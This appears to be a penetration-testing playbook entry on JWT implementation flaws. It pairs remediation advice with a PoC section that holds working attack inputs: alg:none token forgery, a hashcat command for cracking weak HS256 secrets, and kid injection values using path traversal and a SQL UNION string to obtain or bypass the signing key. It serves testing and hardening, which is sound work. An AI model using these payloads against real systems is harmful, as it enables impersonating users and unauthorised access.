---
id: "jwt-none-and-weak-key"
title: "JWT implementation flaws (alg:none / weak keys / predictability / kid injection)"
kind: "implementation"
cve: null
related-cves: null
cve-note: "None (implementation flaw)"
severity: "high"
cvss: 8.1
severity-basis: "cvss"
severity-note: null
product: "Custom Web/App backend (JJWT, java-jwt, PyJWT, etc.)"
versions: "Any"
ports: "80, 443"
keywords: "jwt, alg none, hmac, hashcat 16500, kid, broken access control, privilege escalation"
entry: "JWT authentication and signing-key validation"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic / implementation / configuration flaws; no CVE; see references at the end)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

- Request header `Authorization: Bearer eyJ...`, or Cookie `token=`;
- Decoding the payload reveals values such as `{"alg":"HS256","uid":123,"role":"user"}`.

## Prerequisites

- One regular account + ability to modify your own requests.

## PoC

```bash
# Decode
python3 -c "import base64,sys;print(base64.urlsafe_b64decode(sys.argv[1]+'=='))" <payload>

# 1) alg:none — remove the signature
#    Change the header to {"alg":"none","typ":"JWT"}, modify uid/role in the payload, and leave the signature segment empty

# 2) Brute-force weak HS256 keys
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
#   Common secrets: secret, jwtSecret, xxx2024, company domain, 123456

# 3) kid injection (server uses kid to locate the key file)
{"alg":"HS256","kid":"../../../../dev/null"}   → sign with an empty key
{"alg":"HS256","kid":"key' UNION SELECT 'known'--"}  → retrieve the key through SQL injection

# 4) Predictability: sub/iat in the payload are timestamps, or token = md5(uid)
```

## Exploitation Steps

1. Decode the token and record claims such as `uid`, `role`, `tenant`, and `agentId`.
2. Try none → weak keys → kid injection → predictability; any success enables impersonating arbitrary users.
3. Change `role=admin` / `uid=1` and replay; check for backend access or other users' data (combine with `api-idor-bola.md`).
4. If the server validates only the signature, not expiration (`exp`), old tokens can be reused long-term.
5. Evidence: original token (the final segment may be redacted) + response after forgery.

## Remediation and Mitigation

### Remediation and Mitigation (Hardening)

- Use strongly random keys (≥32 bytes) and rotate regularly; prefer RS256/ES256 with a fixed public key.
- Enforce an `alg` allowlist (reject `none`) and validate `exp`/`iat`/`aud`/`iss` server-side.
- Allow only allowlisted key names for `kid`; prohibit path/SQL concatenation; never put keys in the frontend.
- Short-lived tokens + refresh tokens; step-up verification for sensitive operations.

## References

- OWASP JWT Cheat Sheet; PortSwigger JWT attack series.
